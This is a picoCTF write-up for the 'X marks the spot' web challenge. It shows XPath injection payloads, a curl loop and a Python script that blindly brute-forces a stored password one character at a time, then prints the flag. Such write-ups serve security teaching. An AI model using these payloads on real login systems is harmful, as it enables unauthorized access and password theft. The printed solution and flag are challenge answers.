# X marks the spot
Category: Web, 250 points

## Description

> Another login you have to bypass. Maybe you can find an injection that works?
> 
> Hint: XPATH


## Solution

Visiting the website, we are presented with a login form (and a Robert Frost poem):

```html

        <div class="login-form">
            <form role="form" action="/" method="post">
            <div class="row">
                <div class="form-group col-xs-6">
                    <input type="text" name="name" id="name" class="form-control input-lg" placeholder="username">
                </div>
                <div class="form-group col-xs-6">
                    <input type="text" name="pass" id="pass" class="form-control input-lg" placeholder="password">
                </div>
            </div>
            <div class="row">
                <div class="col-xs-4">
                </div>
                <div class="col-xs-4">
                    <input type="submit" class="btn btn-lg btn-primary btn-block" value="Login">
                </div>
                <div class="col-xs-4">
                </div>
            </div>
			</form>
			<!--
			Two roads diverged in a yellow wood,
			And sorry I could not travel both
			And be one traveler, long I stood
			And looked down one as far as I could
			To where it bent in the undergrowth;

			Then took the other, as just as fair,
			And having perhaps the better claim,
			Because it was grassy and wanted wear;
			Though as for that the passing there
			Had worn them really about the same,

			And both that morning equally lay
			In leaves no step had trodden black.
			Oh, I kept the first for another day!
			Yet knowing how way leads on to way,
			I doubted if I should ever come back.

			I shall be telling this with a sigh
			Somewhere ages and ages hence:
			Two roads diverged in a wood, and I—
			I took the one less traveled by,
			And that has made all the difference.
										-Robert Frost
				-->
		</div>
	  </div>
```

The hint says "XPATH", and using some common XPATH injection techniques we can leak some information about the underlying DB. The idea is similar to SQL injection. We have a vulnerable query for authenticating the username and password which should be similar to:

```
string(//user[name/text()='" + input_username + "' and password/text()='" + input_password + "']/account/text())
```

So, if we inject some valid XPATH vocabulary into the query, we can manipulate it. 

For example, let's inject:

```
' or string-length(//user[position()=1]/pass)>1 or 'a'='
```

This should tell us if the password of the first username is longer than 1 character. If we submit this as the username, we get back a response from the server telling us that "You're on the right path", so we can deduce that password is longer than 1. If we try this, on the other hand, we receive a "Login Failure":

```
' or string-length(//user[position()=1]/pass)>30 or 'a'='
```

So the password is shorter than 30 characters.

Let's use the following syntax to iterate some users and check if someone's password starts with `"pico"`:

```
' or //user[position()=1]/pass[starts-with(text(),'pico')] or 'a'='
```

We'll use `curl`:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Wireshark_twoo_twooo_two_twoo]
└─$ for i in {0..10}
do
    echo $i
    curl -s 'http://mercury.picoctf.net:16521/'  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "name=' or //user[position()=$i]/pass[starts-with(text(),'pico')] or 'a'='+&pass=a" | grep right
done
0
1
2
3
          <!-- <strong>Title</strong> --> You&#39;re on the right path.
4
5
6
7
8
9
10
```

We got a match for the third user. Now let's extract his password with the following script:

```python
from pwn import *
import requests
import string
import urllib

user_id = 3
password = ""

with log.progress('Brute-forcing password') as p:
    index = 1
    while not password.endswith("}"):
        for c in string.ascii_letters + "{}_"  + string.digits:
            p.status(f"Index: {index}, known password: '{password}', trying: '{c}'")
            r = requests.post("http://mercury.picoctf.net:16521/", data = {"name": f"' or substring(//user[position()={user_id}]/pass,{index},1)='{c}' or 'a'='", "pass": "test"})
            if "right" in r.text:
                password += c
                break
        else:
            print(f"Can't find character for index {index}!")
            break

        index += 1
        

print(f"Password: {password}")
```

The script uses XPATH `substring` to brute force the password character by character.

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/X_marks_the_spot]
└─$ python3 solve.py
[+] Brute-forcing password: Done
Password: picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}
```

The flag: `picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`